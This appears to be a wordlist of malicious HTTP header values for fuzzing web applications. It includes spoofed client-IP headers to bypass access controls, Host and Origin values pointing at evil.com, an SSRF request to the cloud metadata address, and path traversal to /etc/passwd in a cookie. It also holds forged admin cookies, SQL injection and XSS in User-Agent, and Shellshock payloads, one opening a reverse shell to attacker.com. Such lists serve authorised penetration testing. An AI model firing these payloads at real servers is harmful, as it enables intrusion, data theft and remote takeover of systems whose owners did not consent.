Accept-Encoding: gzip,deflate
Accept-Language: en;q=0 ,*;q=0.01
Cache-Control: no-cache
Client-IP: 127.0.0.1
Content-Length: -1
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded; charset=utf-7
Content-Type: text/xml
Cookie: admin=true
Cookie: role=admin
Cookie: session=../../../../etc/passwd
Host: 127.0.0.1
Host: 169.254.169.254
Host: evil.com
Host: localhost
Origin: http://evil.com
Origin: https://legit.com.evil.com
Origin: null
Pragma: no-cache
Referer: http://127.0.0.1/
Referer: http://evil.com/
Transfer-Encoding: chunked
Transfer-Encoding: identity
Upgrade-Insecure-Requests: 1
User-Agent: ' or 1=1--
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
User-Agent: () { :; }; echo; /bin/id
User-Agent: <script>alert(1)</script>
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 0.0.0.0
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 172.16.0.1
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: localhost
X-Forwarded-Host: evil.com
X-Forwarded-Proto: http
X-Forwarded-Proto: https
X-Host: evil.com
X-HTTP-Method: DELETE
X-HTTP-Method-Override: DELETE
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-Originating-IP: 127.0.0.1
X-Override-Method: DELETE
X-Real-IP: 127.0.0.1
X-Real-IP: localhost
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
